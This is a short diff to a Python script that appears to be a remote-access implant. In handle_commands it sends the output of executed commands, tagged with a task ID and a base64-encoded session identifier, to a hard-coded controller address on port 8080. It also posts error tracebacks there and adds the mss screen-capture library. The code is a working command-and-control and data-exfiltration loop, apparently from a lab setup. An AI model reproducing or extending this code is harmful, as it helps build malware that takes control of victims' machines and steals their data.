@@ -9,6 +9,8 @@ import pdb
 import json
 import subprocess
 import sys
+import traceback
+from mss import mss
 from os.path import isfile, join
 
 
@@ -72,7 +74,7 @@ def handle_commands(response, identifier):
 
 		if command_output:
 			# Sending out data
-			url = 'http://192.168.19.136:8080/'+res['cmd']+'/output'
+			url = 'http://192.168.19.136:8080/'+res['cmd']+'/output/'+res['task_id']
 			cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 			# custom_headers = {'filename':f}
 
@@ -86,6 +88,7 @@ def handle_commands(response, identifier):
 		# custom_headers = {'filename':f}
 
 		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())
+
 
 		
 
